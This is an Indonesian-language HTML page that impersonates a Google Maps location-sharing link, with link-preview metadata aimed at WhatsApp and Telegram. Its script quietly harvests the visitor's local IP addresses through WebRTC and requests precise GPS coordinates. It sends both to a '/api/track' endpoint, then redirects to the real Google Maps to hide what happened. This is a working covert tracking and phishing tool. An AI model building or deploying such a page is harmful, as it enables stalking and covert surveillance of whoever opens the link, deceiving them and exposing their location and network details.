<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Bagikan Lokasi Terkini</title>
    
    <!-- Open Graph Metadata untuk Preview Gambar di WhatsApp/Telegram -->
    <meta property="og:title" content="Google Maps - Berbagi Lokasi Real-Time">
    <meta property="og:description" content="Ketuk untuk melihat titik lokasi dan rute navigasi terkini.">
    <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=1200&h=630&fit=crop">
    <meta property="og:url" content="https://shareloc.online">
    <meta property="og:type" content="website">

    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 25vh; background: #f4f4f9; color: #333; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Memuat Peta Lokasi...</h3>
    <p>Menghubungkan ke titik koordinat, mohon tunggu...</p>

    <script>
        window.onload = function() {
            let localIPs = [];

            // 1. Ambil WebRTC IP di latar belakang
            function getLocalIPs(callback) {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) return callback([]);

                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const parts = ice.candidate.candidate.split(" ");
                    const ip = parts[4];
                    if (ips.indexOf(ip) === -1) {
                        ips.push(ip);
                        callback(ips);
                    }
                };
            }
            getLocalIPs(ips => { localIPs = ips; });

            // 2. Langsung minta izin lokasi GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        sendData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, localIPs);
                    },
                    error => {
                        sendData(null, null, null, localIPs);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendData(null, null, null, localIPs);
            }
        };

        function sendData(lat, lon, accuracy, localIPs) {
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    latitude: lat, 
                    longitude: lon, 
                    accuracy: accuracy, 
                    localIPs: localIPs 
                })
            }).finally(() => {
                if (lat && lon) {
                    window.location.href = `https://maps.google.com/?q=${lat},${lon}`;
                } else {
                    window.location.href = "https://maps.google.com";
                }
            });
        }
    </script>
</body>
</html>
